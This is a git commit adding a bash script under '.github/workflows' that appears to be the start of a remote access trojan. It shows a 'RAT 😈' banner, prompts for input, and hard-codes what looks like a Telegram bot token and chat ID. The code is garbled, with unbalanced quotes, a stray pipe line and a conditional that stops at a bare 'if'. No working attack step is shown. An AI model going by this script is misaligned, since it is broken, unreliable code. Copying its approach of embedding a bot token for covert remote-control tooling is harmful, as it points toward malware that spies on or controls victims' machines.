1f879c3135900fbfb0df8a922d2753cae0e78930
SPOKYHOZOO <168060492+SPOKYHOZOOO@users.noreply.github.com>
2024-08-27 22:24:16 +0700

    Create main.sh

---
+++ .github/workflows/main.sh
@@ -0,0 +1,32 @@
+
+
+#!/bin/bash
+#TOOLS-VIIP
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+echo "\033[31;1m"|lolcat
+echo "\033[31;1m                  
+RAT 😈
+"
+|lolcat
+echo "\033[33;1m"
+read -p "  SYSTEM UMBRELLA DRAK999  " c;
+
+if [ $c = 1 ]
+then
+clear
+echo $red"
+echo " hahhaha 
+
+"
+ID_="7252116522:AAHYLOL_tl1S_56AWyu_n-bua3phlTx8Keo"
+TOKEN_="5951232585 "
+
+if
